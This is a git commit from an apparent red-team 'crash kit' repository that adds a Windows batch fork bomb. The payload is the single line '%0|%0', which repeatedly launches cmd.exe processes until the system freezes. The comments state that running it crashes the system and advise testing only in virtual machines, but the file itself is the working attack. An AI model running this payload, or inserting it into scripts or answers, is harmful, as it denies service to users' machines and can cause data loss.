53cd12cd0b625eaac27e9c7deefca8bdad5fd4bb
Aryan Giri <227362547+giriaryan694-a11y@users.noreply.github.com>
2025-12-09 20:09:45 +0530

    Create cmd_fork_bomb.bat

---
+++ fork-bombs/cmd_fork_bomb.bat
@@ -0,0 +1,10 @@
+:: Fork Bomb in CMD/Batch
+:: ----------------------
+:: A simple fork bomb that recursively launches new cmd.exe processes.
+::
+:: WARNING: Running this will crash your system. Only test in isolated environments (e.g., VMs).
+::
+:: Author: Aryan Giri
+:: Repo: https://github.com/giriaryan694-a11y/RedTeamCrashKit
+
+%0|%0
